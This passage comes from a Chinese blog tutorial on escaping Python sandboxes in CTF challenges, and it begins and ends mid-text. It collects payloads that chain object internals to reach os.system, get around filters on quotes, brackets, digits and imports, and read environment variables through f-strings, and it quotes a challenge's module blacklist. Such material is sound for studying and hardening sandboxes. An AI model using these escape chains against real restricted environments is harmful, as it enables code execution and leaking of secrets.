的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个  <code>AttributeError</code>  异常。</p><p>如下是  <code>__getattr__</code>  方法的基本形式：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure></div><p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p><p>与  <code>__getattribute__</code>  不同， <code>__getattr__</code>  只有在<strong>属性查找失败</strong>时才会被调用，这使得  <code>__getattribute__</code>  可以用来更为全面地控制属性访问。</p><p>如果在一个类中同时定义了  <code>__getattr__</code>  和  <code>__getattribute__</code> ，那么无论属性是否存在， <code>__getattribute__</code>  都会被首先调用。只有当  <code>__getattribute__</code>  抛出  <code>AttributeError</code>  异常时， <code>__getattr__</code>  才会被调用。</p><p>另外，所有的类都会有 <code>__getattribute__</code> 属性，而不一定有 <code>__getattr__</code> 属性。</p><h5 id="__globals__-替换"><a class="markdownIt-Anchor" href="#__globals__-替换">#</a>  <code>__globals__</code>  替换</h5><p><code>__globals__</code>  可以用 func_globals 直接替换；</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure></div><h5 id="__mro__-__bases__-__base__互换"><a class="markdownIt-Anchor" href="#__mro__-__bases__-__base__互换">#</a>  <code>__mro__</code> 、 <code>__bases__</code> 、 <code>__base__</code> 互换</h5><p>三者之间可以相互替换</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure></div><h4 id="过滤-import"><a class="markdownIt-Anchor" href="#过滤-import">#</a> 过滤 import</h4><p>python 中除了可以使用 import 来导入，还可以使用  <code>__import__</code>  和  <code>importlib.import_module</code>  来导入模块</p><h5 id="__import__"><a class="markdownIt-Anchor" href="#__import__">#</a>  <code>__import__</code></h5><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h5 id="importlibimport_module"><a class="markdownIt-Anchor" href="#importlibimport_module">#</a> importlib.import_module</h5><p>不过 importlib 也需要导入，所以有些鸡肋.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>注意：importlib 需要进行导入之后才能够使用</p><h5 id="__loader__load_module"><a class="markdownIt-Anchor" href="#__loader__load_module">#</a>  <code>__loader__.load_module</code></h5><p>如果使用 audithook 的方式进行过滤，上面的两种方法就无法使用了，但是  <code>__loader__.load_module</code>  底层实现与 import 不同，因此某些情况下可以绕过.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure></div><h4 id="过滤了"><a class="markdownIt-Anchor" href="#过滤了">#</a> 过滤了 []</h4><p>如果中括号被过滤了，则可以使用如下的两种方式来绕过：</p><ol><li>调用 <code>__getitem__()</code>  函数直接替换；#  <code>[x]</code>  &lt;=&gt;  <code>__getitem__(x)</code></li><li>调用 pop () 函数（用于移除列表中的一个元素，默认最后一个元素，<strong>并且返回该元素的值</strong>）替换；</li></ol><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__()替换中括号[]</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()替换中括号[]，结合__getitem__()利用</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="过滤了-2"><a class="markdownIt-Anchor" href="#过滤了-2">#</a> 过滤了 ‘’</h4><h5 id="str-函数"><a class="markdownIt-Anchor" href="#str-函数">#</a> str 函数</h5><p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str () 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div><h5 id="chr-函数"><a class="markdownIt-Anchor" href="#chr-函数">#</a> chr 函数</h5><p>也可以使用 chr 加数字来构造字符串</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure></div><h5 id="list-dict"><a class="markdownIt-Anchor" href="#list-dict">#</a> list + dict</h5><p>使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] <span class="comment"># 返回whoami</span></span><br></pre></td></tr></table></figure></div><h5 id="__doc__"><a class="markdownIt-Anchor" href="#__doc__">#</a>  <code>__doc__</code></h5><p><code>__doc__</code>  变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br></pre></td></tr></table></figure></div><h5 id="bytes-函数"><a class="markdownIt-Anchor" href="#bytes-函数">#</a> bytes 函数</h5><p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()</span><br></pre></td></tr></table></figure></div><h4 id="过滤了-3"><a class="markdownIt-Anchor" href="#过滤了-3">#</a> 过滤了 +</h4><p>过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 join 函数，初始的字符串可以通过 str () 进行获取。具体的字符串内容可以从  <code>__doc__</code>  中取，</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>().join(().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>])</span><br></pre></td></tr></table></figure></div><h4 id="过滤了数字"><a class="markdownIt-Anchor" href="#过滤了数字">#</a> 过滤了数字</h4><p>如果过滤了数字的话，可以使用一些函数的返回值获取。例如：<br>0： <code>int(bool([]))</code> 、 <code>Flase</code> 、 <code>len([])</code> 、 <code>any(())</code> <br>1： <code>int(bool([&quot;&quot;]))</code> 、 <code>True</code> 、 <code>all(())</code> 、 <code>int(list(list(dict(a၁=())).pop()).pop())</code></p><p>有了 0 之后，其他的数字可以通过运算进行获取：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 ** 0 == 1</span><br><span class="line">1 + 1 == 2</span><br><span class="line">2 + 1 == 3</span><br><span class="line">2 ** 2 == 4</span><br></pre></td></tr></table></figure></div><p>当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure></div><p>第三种方法，可以使用 len + dict + list 来构造，这种方式可以避免运算符的的出现</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure></div><p>第四种方法: unicode</p><h4 id="过滤了空格"><a class="markdownIt-Anchor" href="#过滤了空格">#</a> 过滤了空格</h4><p>通过 (),[] 代替</p><h4 id="过滤了运算符"><a class="markdownIt-Anchor" href="#过滤了运算符">#</a> 过滤了运算符</h4><p>== 可以用 in 代替</p><p>or 可以用 | + -。。。- 来替换</p><p>例如</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure></div><p>and 可以用 &amp; * 替代</p><p>例如</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure></div><h4 id="过滤了-4"><a class="markdownIt-Anchor" href="#过滤了-4">#</a> 过滤了 ()</h4><ol><li>利用装饰器 @</li><li>利用魔术方法，例如  <code>enum.EnumMeta.__getitem__</code></li></ol><h4 id="f-字符串执行"><a class="markdownIt-Anchor" href="#f-字符串执行">#</a> f 字符串执行</h4><p>f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息，例如过去环境变量</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line"># Access an element through several links</span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br></pre></td></tr></table></figure></div><p>也可以直接 RCE</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">kali</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div><h4 id="过滤了内建函数"><a class="markdownIt-Anchor" href="#过滤了内建函数">#</a> 过滤了内建函数</h4><h4 id="eval-list-dict-构造"><a class="markdownIt-Anchor" href="#eval-list-dict-构造">#</a> eval + list + dict 构造</h4><p>假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数。如果某个模块已经被导入了，则也可以获取这个模块中的函数。</p><h4 id="过滤了-和-如何获取函数"><a class="markdownIt-Anchor" href="#过滤了-和-如何获取函数">#</a> 过滤了。和 ，如何获取函数</h4><p>通常情况下，我们会通过点号来进行调用 <code>__import__('binascii').a2b_base64</code></p><p>或者通过 getattr 函数： <code>getattr(__import__('binascii'),'a2b_base64')</code></p><p>如果将，号和。都过滤了，则可以有如下的几种方式获取函数：</p><ol><li><p>内建函数可以使用 <code>eval(list(dict(s_t_r=1))[0][::2])</code>  这样的方式获取。</p></li><li><p>模块内的函数可以先使用 <code>__import__</code> 导入函数，然后使用 vars () j 进行获取：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">vars</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function a2b_base64&gt;</span><br></pre></td></tr></table></figure></div></li></ol><h4 id="unicode-绕过"><a class="markdownIt-Anchor" href="#unicode-绕过">#</a> unicode 绕过</h4><p>Python 3 开始支持非 ASCII 字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/KNHh3LtUlbfiruA.png" alt="image.png"></p><p>相似 unicode 寻找网站：<a class="link" href="http://shapecatcher.com/">http://shapecatcher.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>可以通过绘制的方式寻找相似字符</p><p>下划线可以使用对应的全角字符进行替换：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＿</span><br></pre></td></tr></table></figure></div><p>使用时注意第一个字符不能为全角，否则会报错：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿)</span><br><span class="line">__main__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F)</span><br></pre></td></tr></table></figure></div><p><strong>需要注意的是，某些 unicode 在遇到 lower () 函数时也会发生变换，因此碰到 lower ()、upper () 这样的函数时要格外注意。</strong></p><h3 id="绕过命名空间限制"><a class="markdownIt-Anchor" href="#绕过命名空间限制">#</a> 绕过命名空间限制</h3><h4 id="部分限制"><a class="markdownIt-Anchor" href="#部分限制">#</a> 部分限制</h4><p>有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span 